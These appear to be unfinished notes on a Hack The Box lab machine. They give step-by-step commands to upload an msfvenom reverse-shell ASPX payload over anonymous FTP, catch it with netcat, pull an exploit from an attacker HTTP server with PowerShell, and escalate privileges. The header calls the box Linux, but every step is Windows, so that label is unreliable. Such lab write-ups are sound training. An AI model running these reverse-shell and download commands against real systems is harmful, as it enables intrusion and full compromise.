# NOT DONE YET
# Paper
* Link: https://app.hackthebox.com/machines/Paper
* Type: Linux
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA DIR IPADDRESS* - Nmap scan.

* *ftp IPADDRESS* - to connect to the target using FTP.
* In FTP:
  - To log in as anonymous, type the username as *anonymous* and any password.
  - *put FILENAME* - uploads file
  - *delete FILENAME* - deletes file
    
* *msfvenom -l payloads | grep window* - Search for payloads in Metasploit (The grep is to get payloads specific to Windows)
* *msfvenom -p windows/shell/reverse_tcp LHOST=IPADDRESS LPORT=PORTNUMBER -f aspx -o FILENAME.aspx* (You can change the format to any of the formats supported by metasploit)
* *nc -lvnp 4444* starts a listener (Note that Netcat can only listen to stageless payloads and not staged.)
* *python -m SimpleHTTPServer PORTNUMBER* - Starts a simple HTTP server using python (Can be used to upload files to target system)

* In Windows:
  - *systeminfo* gets information about the system, most importantly,
    1. HotFixes - Indicates updates
    2. System Type - Shows the type of the system
    3. OS Version - Shows the version of the system.
  - *dir* to list files in a directory
  - *type TEXTFILENAME* reads the content of the text file.
  - *EXEFILENAME* runs the exe file.
  - *powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IPADDRESS:PORTNUMBER/FILENAME', 'PATHTODOWNLOAD\FILENAME')"* - Downloads a file using PowerShell.
* *searchsploit -m 40564* - Gets the PoC for the specified CVE.
* *i686-w64-mingw32-gcc FILENAME.c -o FILENAME.exe -lws2_32* compiles a c file into the executable exe.

## Steps
* Start by checking the open ports using nmap (nmap -sC -sV -oA DIR IPADDRESS)
* use *ftp IPADDRESS* to connect (Anonymous Login).
* Since it's Windows it uses ASP/ASPX.
* If you use a x64 payload on a x86 system it will not work. However, if you use a x86 payload on a x64 system it will work. (it's recommended to use reverse TCP - windows/shell/reverse_tcp)
* Create a reverse shell (msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f aspx -o tempWindows.aspx).
* Upload it to the server using the ftp connection.
* run a netcat listner to listen for the reverse connection.
* Run the file by using any browser.
* Enumerate info about the system.
* Google some privilage escelation exploits (2011-1249 & 40564)
* Get the PoC for the CVE.
* Upload it to the server using a python server and Powershell command.
* Run the payload.
* Now you should have root on the system.
* The flags are in the desktops of the users.

## Why is the machine vulnerable
* FTP anonymous login is enabled when it shouldn't. If there is a necessary need for it then at grant it with limited privileges (i.e. only Download)
* The Machine is not patched/updated. 
